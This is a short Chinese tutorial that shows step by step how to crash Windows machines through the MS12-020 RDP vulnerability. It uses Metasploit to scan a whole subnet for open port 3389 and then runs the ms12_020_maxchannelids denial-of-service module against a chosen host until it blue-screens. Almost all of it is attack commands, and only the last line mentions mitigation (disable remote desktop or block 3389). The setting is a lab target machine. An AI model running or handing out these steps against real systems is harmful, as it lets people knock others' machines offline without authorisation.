# 蓝屏攻击（ms12-020）

**漏洞名：MS12-020（全称：Microsoft windows远程桌面协议RDP远程代码执行漏洞）**

**介绍：RDP协议是一个多通道的协议，让用户连上提供微软终端机服务的电脑。 windows\**在处理某些对象时存在错误，可通过特制的RDP报文访问未初始化或已经删除的对象，导致任意代码执行。 然后控制系统。**



打开kali，输入msfconsole

```
msfconsole
```

![](/img/ms12-020/1.png)



输入search ms12-020，搜索ms12-020模块

```
search ms12-020
```

![](/img/ms12-020/2.png)

![](https://img1.baidu.com/it/u=3841389505,2206470018&fm=26&fmt=auto)



使用模块

```
 use auxiliary/scanner/rdp/ms12_020_check 
```

![](/img/ms12-020/3.png)



查看选项

```
show options
```

![](/img/ms12-020/4.png)



配置靶机IP，直接全部网段

![](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.b7.cn%2Fd%2Ffile%2F20190819%2F1d4db9dadbddf0772ace1092555b7f7f.jpg&refer=http%3A%2F%2Fwww.b7.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1639568631&t=94209645f067be0d581269ab7f1061bf)

```
set rhosts 172.16.1.0/24
```

![](/img/ms12-020/5.png)



执行

```
run
```

![](/img/ms12-020/6.png)



有绿色加号的就是有开启3389端口，就可以去使用另一个攻击模块了

```
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids 
```

![](/img/ms12-020/2.png)

![](/img/ms12-020/7.png)



配置靶机（就是有绿色的IP）

```
set rhosts 172.16.1.12
```

![](/img/ms12-020/8.png)



执行

```
run
```

![](/img/ms12-020/9.png)

靶机就蓝屏了

就很简单

![](https://img2.baidu.com/it/u=1765999030,3540847987&fm=26&fmt=auto)

解决这个漏洞就是关闭电脑的远程连接或者防火墙入站规则拒绝3389
